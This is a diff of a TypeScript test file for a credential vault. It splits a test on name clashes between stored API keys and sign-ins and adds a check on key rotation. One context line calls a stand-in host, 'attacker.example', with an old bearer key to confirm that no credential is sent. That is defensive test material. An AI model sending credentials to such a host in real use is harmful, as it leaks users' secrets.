@@ -352,18 +352,20 @@ test("a sign-in of the removed kind (no device address) is never used, and says 
   assert.match(await call({ action: "call", url: "https://attacker.example/x", auth: { key: "old", as: "bearer" } }), removed, "and none is sent");
 });
 
-test("a name is one secret: a key can't take a sign-in's name, nor a sign-in a key's", async () => {
+test("a key can't take a sign-in's name: asked for, or posted by a stale page, the sign-in stays", async () => {
   await seed("dev");
   await call({ action: "library" }); // the Vault is there
-  const signInTaken = /"dev" is a sign-in already: use another name, or the user deletes it on the Vault first/;
-  assert.match(await call({ action: "secret", site: "api.example.com", label: "dev" }), signInTaken, "asked for a key under its name: told, and the Vault asks for none");
+  assert.match(await call({ action: "secret", site: "api.example.com", label: "dev" }), /"dev" is a sign-in already: use another name, or the user deletes it on the Vault first/, "told, and the Vault asks for no key");
   assert.deepEqual(vaultState().needs, []);
   postVault({ ev: "key-save", label: "dev", site: "api.example.com", sealed: seal("k") }); // as a stale page could post it
-  assert.equal(await statusOf("dev"), "ready to sign in", "the sign-in stays");
+  assert.equal(await statusOf("dev"), "ready to sign in");
+});
+
+test("a sign-in can't take a key's name, and a key is still rotated by saving it again", async () => {
   await giveKey("kk", "api.example.com", "v1");
   await assert.rejects(saveSignIn("127.0.0.1", "kk", definitionAt(OTHER), "client-1"), /"kk" is a key already: use another name/);
   assert.equal(await statusOf("kk"), "saved", "the key stays");
-  await giveKey("kk", "api.example.com", "v2"); // a key is rotated by saving it again
+  await giveKey("kk", "api.example.com", "v2");
   assert.equal(vaultState().secrets.filter((s: { label: string }) => s.label === "kk").length, 1);
 });
 
